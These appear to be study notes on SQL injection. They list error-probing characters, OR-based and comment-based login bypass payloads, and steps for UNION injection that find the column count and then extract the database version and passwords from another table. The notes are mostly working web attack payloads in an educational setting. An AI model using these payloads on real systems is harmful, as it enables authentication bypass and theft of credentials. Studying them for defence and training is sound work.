- Checking
	- Try the below payloads to see if have errors
	- Will cause something likese
		- `SELECT * FROM logins WHERE username=''' AND password = 'something';`
		- Odd number of quotes, thus error

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |


- Remember that AND is executed first before OR

# OR injections
- Input username as `admin' or '1'='1` and password as `something`
	- `SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
	- `SELECT * FROM logins WHERE username='admin' or ('1'='1' AND password = 'something');
		- If username `admin` exists, will authenticate
- What if admin doesnt exist?
- Input password as `something' or '1'='1 ` so the second part will be true
- `SELECT * FROM logins WHERE username='admin' or ('1'='1' AND password = 'something' or '1'=1');

# Comment
- Input username as `admin') -- `
	- `)` - assuming the code uses `WHERE (username = ...)`
	-  ` -- ` -> comment the next part is ignored
	- `SELECT * FROM logins WHERE (username = 'admin') -- ' AND id > 1) AND password = 'a8f5f167f44f4964e6`

# Union
- `SELECT * FROM table1 UNION SELECT * FROM table2`
	- Combine outputs of the 2 tables 
	- Must have equal numbers of columns
	- `SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '`
- If different number of columns, can just pad with 'NULL'
- `SELECT * from products where product_id = '1' UNION SELECT username, NULL from passwords`

Union injection
- First, find number of columns
	- Using Order BY
		- `' order by 1-- -`
			- Then increment until it no longer works. The last working value is number of columns
	- Using Union
		- `cn' UNION select 1,2,3-- -`
			- cn is just arbitrary name to end the query
			- Try 1,2,3,4 onwards until it matches.
- Take note of what is returned to see location of injection (may not work for all columns)
- Then inject
	- `cn' UNION select 1,@version,3,4-- -`
